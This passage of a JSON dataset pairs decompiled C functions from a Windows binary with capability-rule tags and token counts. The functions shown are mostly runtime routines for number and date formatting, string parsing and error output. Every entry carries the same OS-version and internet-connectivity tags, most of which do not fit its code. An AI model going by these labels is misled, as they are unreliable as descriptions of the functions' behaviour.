= 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x0040b3f8;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x0040b4ba;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x0040b4ba:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x0040b4cd;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x0040b4cd:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x0040b4d0;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x0040b3f8;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x0040b4d0:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1193
    },
    "0040b5cc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b5cc(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x49780f;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.0040b683();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.0040b68e();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.0040b68e();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.0040b6aa(iVar4);\n        }\n        fcn.0040b683();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00404124();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 535
    },
    "0040be34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be34(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.0040bbe0(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0040be6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040be6c(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.0040b900(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "0040c140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c140(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1eh;\n    int16_t var_1ah;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    uStack68 = 0x40c8c4;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        var_1eh._0_1_ = 0x20;\n        var_4h = in_EAX;\n        while (*var_4h != 0) {\n            uVar1 = *var_4h;\n            if ((*((uVar1 >> 3) + 0x491828) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040e770();\n                uVar6 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar6 = uVar1 - 0x20;\n                }\n                uVar3 = var_1eh;\n                if (((uVar6 + 0xbf < 0x1a) && (uVar3 = uVar6,  uVar6 == 0x4d)) && (var_1eh == 0x48)) {\n                    uVar6 = 0x4e;\n                    uVar3 = uVar6;\n                }\n                var_1eh._0_1_ = uVar3;\n    // switch table (57 cases) at 0x40c261\n                switch(uVar6) {\n                case 0x22:\n                case 0x27:\n                    while ((*var_4h != 0 && (*var_4h != uVar1))) {\n                        if ((*((*var_4h >> 3) + 0x491828) >> (*var_4h & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040e770();\n                        }\n                    }\n                    fcn.0040bd5c(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.0040bd5c(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x497811 != '\\0') {\n                        fcn.0040bd5c(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x49781c != '\\0') {\n                        fcn.0040bd5c(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.0040be6c(&stack0xfffffffc);\n                    iVar5 = fcn.0040a9fc();\n                    if (iVar5 == 0) {\n                        fcn.0040bd5c(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.0040a9fc();\n                        if (iVar5 == 0) {\n                            fcn.0040bd5c(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.0040a9fc();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.0040bda0(arg_8h);\n                                }\n                                else {\n                                    fcn.0040bda0(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.0040a9fc();\n                                if (iVar5 == 0) {\n                                    fcn.0040be34(&stack0xfffffffc);\n                                    uVar7 = *(arg_8h + 8);\n                                    fcn.0040bc70(uVar7, *(arg_8h + 0xc));\n                                    fcn.0040bda0(uVar7);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.0040a9fc();\n                                    if (iVar5 == 0) {\n                                        fcn.0040be34(&stack0xfffffffc);\n                                        uVar7 = *(arg_8h + 8);\n                                        fcn.0040bc70(uVar7, *(arg_8h + 0xc));\n                                        fcn.0040bda0(uVar7);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.0040bd5c(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040c140(arg_8h);\n                    fcn.0040be6c(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (var_1ah != 0)) {\n                        fcn.0040bd5c(arg_8h);\n                        fcn.0040c140(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.0040be08(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040be34(&stack0xfffffffc);\n                        fcn.0040bdbc(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bc70(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bda0(uVar7);\n                    }\n                    else if (var_ch == 4) {\n                        uVar7 = *(arg_8h + 8);\n                        fcn.0040bc70(uVar7, *(arg_8h + 0xc));\n                        fcn.0040bda0(uVar7);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.0040c140(arg_8h);\n                    }\n                    else {\n                        fcn.0040c140(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be34(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040c028(&stack0xfffffffc);\n                    fcn.0040bda0(iVar5);\n                    break;\n                case 0x47:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be34(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.0040beac(&stack0xfffffffc);\n                    fcn.0040bda0(iVar5);\n                    break;\n                case 0x48:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be6c(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (*puVar4 != 0) {\n                        if ((*((*puVar4 >> 3) + 0x491828) >> (*puVar4 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x0040c4b6;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x0040c4b6:\n                                if (!bVar2) {\n                                    iVar5 = fcn.0040a9fc();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.0040a9fc(),  iVar5 != 0)) {\n                                        fcn.0040a9fc();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040e770();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdbc(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be34(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040bdbc(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.0040bda0(arg_8h);\n                    }\n                    else {\n                        fcn.0040bda0(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be6c(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdbc(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be6c(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.0040bdbc(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.0040be08(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.0040c140(arg_8h);\n                    }\n                    else {\n                        fcn.0040c140(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be34(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.0040bdbc(arg_8h);\n                    }\n                    else {\n                        fcn.0040bdbc(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.0040be08(&stack0xfffffffc);\n                    fcn.0040be6c(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.0040bdbc(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040e750();\n                fcn.0040bd5c(iVar5);\n                var_4h = fcn.0040e770();\n                var_1eh._0_1_ = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x40c8cb;\n    uStack68 = 0x40c8c3;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 2776
    },
    "0040cbb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040cbb4(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x4978d8;\n    puVar4 = 0x4978f4;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.004059dc();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.0040e998();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 229
    },
    "0040cc08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cc08(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x4978cc == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040bd48();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 242
    },
    "0040cc64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cc64(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    ushort var_18h;\n    uint var_16h;\n    ushort var_12h;\n    ushort var_10h;\n    char var_eh;\n    uchar var_dh;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_8h = 0;\n    uStack64 = 0x40cf86;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_16h._0_2_ = 0;\n    var_18h = 0;\n    var_1ch._0_1_ = 0;\n    var_dh = 0;\n    var_eh = fcn.0040cb20();\n    var_4h = 0;\n    if (**0x497814 == 'g') {\n        fcn.0040cb6c();\n        fcn.00405a44(&fcn.0040cc64::var_20h);\n        fcn.00409b7c();\n        var_4h = fcn.0040cbb4();\n    }\n    else {\n        iVar2 = fcn.0040e8cc();\n        if (0 < iVar2) {\n            var_4h = *0x4978f4;\n        }\n    }\n    cVar1 = fcn.0040c978(&fcn.0040cc64::var_1ch + 3);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.0040cae4(),  cVar1 != '\\0')) {\n        in_stack_ffffffac = 0x40cd52;\n        cVar1 = fcn.0040c978(&fcn.0040cc64::var_1ch + 2);\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0040cae4();\n            if (cVar1 == '\\0') {\n                fcn.0040bd48();\n                if (var_eh == '\\x01') {\n                    var_18h = var_10h;\n                    var_16h._0_2_ = var_12h;\n                }\n                else {\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n            }\n            else {\n                in_stack_ffffffac = &fcn.0040cc64::var_1ch + 1;\n                cVar1 = fcn.0040c978(in_stack_ffffffac);\n                if (cVar1 == '\\0') goto code_r0x0040cf63;\n                if (var_eh == '\\0') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_10h;\n                    var_18h = var_12h;\n                }\n                else if (var_eh == '\\x01') {\n                    var_1ch._0_1_ = var_1ch._1_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_10h;\n                }\n                else if (var_eh == '\\x02') {\n                    var_1ch._0_1_ = var_1ch._3_1_;\n                    var_16h._0_2_ = var_12h;\n                    var_18h = var_16h._2_2_;\n                }\n                if (var_4h < 1) {\n                    if (var_1ch < 3) {\n                        fcn.0040bd48();\n                    }\n                }\n                else {\n                    fcn.0040cc08(&stack0xfffffffc);\n                }\n            }\n            fcn.0040cae4();\n            fcn.0040c954();\n            if ((*0x4978d4 != '\\0') && (iVar2 = fcn.00405b28(),  iVar2 != 0)) {\n                if (**0x497828 - 0x30U < 10) {\n                    fcn.0040cb6c();\n                }\n                else {\n                    do {\n                        while ((iVar2 = fcn.0040580c(),  *param_2 <= iVar2 && (*(in_EAX + -1 + *param_2) != ' '))) {\n                            *param_2 = *param_2 + 1;\n                        }\n                        fcn.0040c954();\n                        iVar2 = fcn.0040580c();\n                        if (iVar2 < *param_2) break;\n                        fcn.0040580c();\n                        fcn.00405a44();\n                        iVar2 = fcn.00409b18();\n                        if (iVar2 == 0) break;\n                        fcn.0040580c();\n                        fcn.00405a44();\n                        iVar2 = fcn.00409b18();\n                    } while (iVar2 != 0);\n                }\n            }\n            var_dh = fcn.0040b998(var_ch);\n            in_stack_ffffffac = var_ch;\n        }\n    }\ncode_r0x0040cf63:\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405554(0x40cf8d);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1304
    },
    "0040cfb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040cfb0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *in_stack_ffffffd0;\n    uint16_t in_stack_ffffffd4;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint32_t uStack32;\n    ushort uStack28;\n    ushort uStack26;\n    uchar auStack24 [4];\n    uchar auStack20 [4];\n    \n    uVar2 = 0;\n    iVar3 = -1;\n    cVar1 = fcn.0040ca0c();\n    if ((cVar1 == '\\0') && (cVar1 = fcn.0040ca0c(),  cVar1 == '\\0')) {\n        cVar1 = fcn.0040ca0c();\n        if ((cVar1 != '\\0') || (cVar1 = fcn.0040ca0c(),  cVar1 != '\\0')) {\n            iVar3 = 0xc;\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (-1 < iVar3) {\n        fcn.0040c954();\n    }\n    cVar1 = fcn.0040c978(&stack0xffffffec);\n    if (cVar1 != '\\0') {\n        uStack32 = uStack32 & 0xffff;\n        uStack28 = 0;\n        uStack26 = 0;\n        arg_8h_00 = 0x40d062;\n        cVar1 = fcn.0040cae4();\n        if (cVar1 != '\\0') {\n            arg_8h_00 = &stack0xffffffe8;\n            cVar1 = fcn.0040c978(arg_8h_00);\n            if (cVar1 == '\\0') {\n                return 0;\n            }\n            in_stack_ffffffd4 = 0xd090;\n            cVar1 = fcn.0040cae4();\n            if (cVar1 != '\\0') {\n                arg_8h = &stack0xffffffe4;\n                cVar1 = fcn.0040c978(arg_8h);\n                in_stack_ffffffd4 = arg_8h;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                in_stack_ffffffd0 = 0x40d0be;\n                cVar1 = fcn.0040cae4();\n                if (cVar1 != '\\0') {\n                    in_stack_ffffffd0 = &stack0xffffffe0;\n                    cVar1 = fcn.0040c978(in_stack_ffffffd0);\n                    if (cVar1 == '\\0') {\n                        return 0;\n                    }\n                }\n            }\n        }\n        if (iVar3 < 0) {\n            cVar1 = fcn.0040ca0c();\n            if ((cVar1 == '\\0') && (cVar1 = fcn.0040ca0c(),  cVar1 == '\\0')) {\n                cVar1 = fcn.0040ca0c();\n                if ((cVar1 != '\\0') || (cVar1 = fcn.0040ca0c(),  cVar1 != '\\0')) {\n                    iVar3 = 0xc;\n                }\n            }\n            else {\n                iVar3 = 0;\n            }\n        }\n        if ((iVar3 < 0) || ((in_stack_ffffffd4 != 0 && (in_stack_ffffffd4 < 0xd)))) {\n            fcn.0040c954();\n            uVar2 = fcn.0040b850(in_stack_ffffffd0, arg_8h_00 >> 0x10);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 825
    },
    "0040d3ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d3ac(int32_t *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    fcn.0040d334(arg_8h);\n    if (*arg_8h == 0) {\n        fcn.00407550();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0040d50c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040d50c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 1;\n    while( true ) {\n        if (*(iVar1 * 4 + 0x4978d4) == 0) {\n            fcn.00405728();\n            return 1;\n        }\n        if (iVar1 == 7) break;\n        iVar1 = iVar1 + 1;\n    }\n    return 0;\n}\n",
        "token_count": 106
    },
    "0040da34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040da34(void)\n\n{\n    uint uVar1;\n    uint uStack1128;\n    uchar *puStack1124;\n    uchar *puStack1120;\n    uint uStack1116;\n    uchar *puStack1112;\n    uint uStack1108;\n    uchar *puStack1104;\n    uchar *puStack1100;\n    uchar auStack1092 [48];\n    uchar auStack1044 [8];\n    uchar auStack1036 [8];\n    uchar auStack1028 [1028];\n    \n    puStack1100 = 0x40da48;\n    fcn.0040d8ac(0x400);\n    if (**0x494ba0 == '\\0') {\n        puStack1100 = 0x40;\n        puStack1104 = &stack0xfffffbbc;\n        uStack1108 = *(*0x4948b8 + 4);\n        puStack1112 = 0x40daca;\n        puStack1112 = fcn.00406a10();\n        uStack1116 = 0x40dad0;\n        sub.user32.dll_LoadStringA_1();\n        uStack1116 = 0x2010;\n        puStack1120 = &stack0xfffffbac;\n        puStack1124 = &stack0xfffffbec;\n        uStack1128 = 0;\n        sub.user32.dll_MessageBoxA_1();\n    }\n    else {\n        puStack1100 = 0x40da5c;\n        fcn.00403820();\n        puStack1100 = 0x40da61;\n        fcn.0040305c();\n        puStack1100 = &stack0xfffffbfc;\n        puStack1104 = &stack0xfffffbfc;\n        puStack1112 = &stack0xfffffbb0;\n        uStack1108 = 0x40da70;\n        sub.user32.dll_CharToOemA();\n        uStack1108 = 0;\n        uStack1116 = 0x40da80;\n        uStack1116 = fcn.0040a868();\n        puStack1120 = &stack0xfffffbf4;\n        puStack1124 = 0xfffffff4;\n        uStack1128 = 0x40da8d;\n        uStack1128 = sub.kernel32.dll_GetStdHandle_1();\n        sub.kernel32.dll_WriteFile_1();\n        uVar1 = sub.kernel32.dll_GetStdHandle_1(0xfffffff4, 0x40daf8, 2, &stack0xfffffb98, 0);\n        sub.kernel32.dll_WriteFile_1(uVar1);\n    }\n    return;\n}\n",
        "token_count": 581
    },
    "0040df54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040df54(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *puVar4;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint lpFilename;\n    uint lpBuffer;\n    uint hModule;\n    int32_t var_10h;\n    uint var_4h;\n    \n    puStack384 = &stack0xfffffffc;\n    var_14ch = 0;\n    var_154h = 0;\n    var_150h = 0;\n    var_4h = 0;\n    uStack388 = 0x40e10f;\n    uStack392 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack392;\n    iVar1 = *(arg_8h + -4);\n    if (*(iVar1 + 0x14) == 0) {\n        puStack384 = &stack0xfffffffc;\n        fcn.00407550();\n    }\n    else {\n        fcn.00407550();\n    }\n    uVar2 = *(iVar1 + 0x18);\n    sub.kernel32.dll_VirtualQuery_1(*(iVar1 + 0xc), &lpBuffer, 0x1c);\n    if (var_10h == 0x1000) {\n        iVar3 = sub.kernel32.dll_GetModuleFileNameA_1(hModule, &lpFilename, 0x105);\n        if (iVar3 != 0) {\n            var_148h = *(iVar1 + 0xc);\n            var_144h._0_1_ = 5;\n            fcn.004057a0();\n            fcn.0040a68c();\n            var_140h = var_14ch;\n            var_13ch._0_1_ = 0xb;\n            var_138h = var_4h;\n            var_134h._0_1_ = 0xb;\n            var_12ch._0_1_ = 5;\n            puVar4 = &var_148h;\n            arg_8h_00 = 3;\n            var_130h = uVar2;\n            fcn.00407550();\n            fcn.0040db38(arg_8h_00, puVar4);\n            goto code_r0x0040e0de;\n        }\n    }\n    var_16ch = *(iVar1 + 0xc);\n    var_168h._0_1_ = 5;\n    var_164h = var_4h;\n    var_160h._0_1_ = 0xb;\n    var_158h._0_1_ = 5;\n    puVar4 = &var_16ch;\n    arg_8h_00 = 2;\n    var_15ch = uVar2;\n    fcn.00407550();\n    fcn.0040db38(arg_8h_00, puVar4);\ncode_r0x0040e0de:\n    